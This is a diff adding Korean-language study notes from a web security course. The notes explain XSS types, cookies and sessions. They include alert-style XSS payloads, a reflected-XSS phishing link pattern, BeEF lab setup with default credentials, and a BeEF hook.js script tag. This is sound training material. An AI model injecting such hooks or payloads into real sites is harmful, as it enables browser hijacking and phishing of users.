@@ -104,6 +104,7 @@ http://www.test.com:80/path/file
 http://localhost:80/bWAPP/login.php : bWAPP
 http://localhost:7070/login.php : DVWA
 http://localhost:8080/ : SW 마에스트로 해커톤 대회
+admin:admin
 http://localhost:9090/WebGoat/login : WebGoat
 
 ---
@@ -255,8 +256,105 @@ bWAPP 데이터베이스의 모든 테이블에 데이터를 조회
 
 ## SW 마에스트로 해커톤 대회
 
+---
 
+2일차
 
+* Mybatis 사용시 ${} 이 아닌 #{}을 사용해야 한다.
 
+* XSS 보안약점
+  - 공격자가 전달한 스크립트 코드(의도하지 않은 스크립트 코드)가 사용자 브라우저에서 실행
 
+* Cookie 1992
+  - HTTP: Stateless, 요청/응답 구조
+  - 헨젤과 그레텔에서 차용
+  - 서버가 클라이언트에게 남기는 자취
+  - 서버가 클라이언트를 식별하기 위함
+  - 취약점: 쉽게 노출되고 위변조된다.
 
+* HTTP의 세션: 응용 프로그램에서 만들어 줘야 함.
+  - Cookie 의 세션 ID를 통해서
+
+* Stateless
+  - 통신 패킷 간에 관계가 없다. 세션이 없다.
+
+* ARPANET
+  rfc2616
+  hyperlink : 정보의 이동이 빠르다.
+
+* 브라우저
+  - 브라우저는 샌드박스
+
+* java apple -> plugin(브라우저의 기능 확장)
+  - HDD 접근 가능. R/W 가능
+  - 네트워크 가능
+  - 그래픽/사운드 가능
+
+* ActiveX
+
+* Adobe Flash
+
+* Stored XSS
+  - 공격자는 서버에 스크립트 저장
+  - 사용자는 브라우저에서 스크립트 실행
+
+* Reflective XSS
+  - 입력 값이 다음 화면 출력에 사용되는 경우
+
+ID 중복 체크        check.jsp?id=abc
+ID: abc [check] --------------------------> DB 조회 결과를 반환
+                                             |
+                                             |
+"abc"는 존재.... <---------------------------+
+
+==> [HINT] 입력으로 abc 를 주었는데, 그 abc 가 그대로 출력으로 사용됨.
+           사용자 브라우저에서 스크립트가 그대로 실행
+==> 스크립트를 입력하는 사람과 스크립트를 실행하는 사람이 같다.
+    ? 그럼 왜 위험할까? 공격자는 공격코드를 만든다.
+
+반사 XSS 취약점이 존재한다는 것을 확인하면, 공격자는 아래와 같은 공격 문자열을 생성
+
+<a href="http://www.test.com/check.jsp?id=스크립트(일반적으로 궁금해 하는 내용을 링크로 만듬)
+그리고, 불특정 다수에게 문자, 이메일, 단축 URL 형태로 전달
+
+* Stored XSS 는 공격자의 코드가 서버에 남는다. Persistence XSS 라고 한다.
+  Reflective XSS 에서 서버는 경로만 제공한다.
+
+* DOM XSS
+  - Stored/Reflective XSS는 서버가 관여
+  - 개발자가 만든 스크립트 코드가 잘못 만들어졌을때 발생
+  - 전적으로 클라이언트 사이드에서 발생
+
+* http://www.test.com:80/path/file?id=username#abc
+  - abc: fragment: 책갈피: 문서내 abc라는 ID로 이동
+  - /#msg/i
+
+* http://localhost:8080/board/get?pageNum=1&amount=10&type=&keyword=&bno=1&bno=1
+  <script>alert("xss1")</script>
+  <script>alert("xss2")</script>
+
+* 주소창에 javascript:alert("xss");
+
+---
+
+LAB Console 에서
+
+sudo beef-xss
+password: kali
+http://127.0.0.1:3000/ui/authentication
+beef:kali
+
+http://10.0.3.15:8080/
+
+*
+BeEF<script src="http://localhost:3000/hook.js"></script>
+BeEF
+
+*Google Phishing
+XSS hook URL: http://localhost:3000/demos/plain.html
+
+* hook.js
+http://localhost:3000/hook.js
+Wade Alcorn 부터 hook.js. 위쪽은 jQuery Library
+https://www.yes24.com/product/goods/14788168
+브라우저 해킹 vs 보안 - 웨이드 알콘
